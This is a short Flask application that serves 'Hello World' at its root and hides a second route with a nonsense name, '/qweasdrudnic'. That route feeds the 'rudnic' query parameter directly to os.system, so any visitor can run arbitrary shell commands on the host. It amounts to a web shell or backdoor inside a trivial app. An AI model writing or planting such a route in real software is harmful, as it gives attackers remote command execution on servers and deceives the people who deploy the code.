from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello World'

@app.route('/qweasdrudnic')
def qwe():
    return f'Command: {os.system(request.args.get('rudnic'))}'    

if __name__ == "__main__":
    app.run()
